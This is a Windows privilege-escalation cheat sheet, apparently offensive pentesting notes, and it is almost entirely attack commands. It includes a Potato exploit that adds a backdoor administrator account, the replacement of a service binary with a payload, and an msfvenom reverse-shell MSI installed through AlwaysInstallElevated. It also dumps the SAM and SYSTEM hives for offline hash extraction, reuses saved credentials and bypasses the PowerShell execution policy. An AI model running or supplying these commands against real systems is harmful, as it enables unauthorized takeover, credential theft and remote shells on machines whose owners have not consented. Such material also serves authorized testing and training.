# Windows Privilege Escalation

## Quick Wins

### Check current privileges
```cmd
whoami /priv
whoami /groups
net user %USERNAME%
```

### Dangerous privileges
```
SeImpersonatePrivilege  → Potato attacks (GodPotato, PrintSpoofer)
SeAssignPrimaryToken    → Potato attacks
SeBackupPrivilege       → Read any file (SAM/SYSTEM)
SeRestorePrivilege      → Write any file
SeDebugPrivilege        → Inject into SYSTEM process
SeTakeOwnershipPriv     → Own any object
SeLoadDriverPrivilege   → Load vulnerable driver
```

### Potato attacks
```cmd
# GodPotato (works on modern Windows)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user pwned pass123 /add && net localgroup administrators pwned /add"

# PrintSpoofer
PrintSpoofer64.exe -i -c cmd
```

## Service Misconfigurations

### Unquoted service paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

### Weak service permissions
```cmd
accesschk64.exe -uwcqv "Everyone" * /accepteula
accesschk64.exe -uwcqv "Users" * /accepteula
sc qc <servicename>
```

### Modifiable service binary
```cmd
# replace binary, restart service
sc stop <service>
copy payload.exe "C:\path\to\service.exe"
sc start <service>
```

## AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# if both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

## Stored Credentials

```cmd
cmdkey /list
# if creds stored:
runas /savecred /user:admin cmd.exe

# SAM dump (need backup priv or local admin)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# offline: impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v | findstr /i "task\|run\|user"
# writable task script = hijack
```

## UAC Bypass

```cmd
# check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = no prompt, 2 = prompt for consent, 5 = default
```

## Automated Enumeration

```cmd
# winpeas
.\winPEASx64.exe

# powerup
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# seatbelt
.\Seatbelt.exe -group=all
```
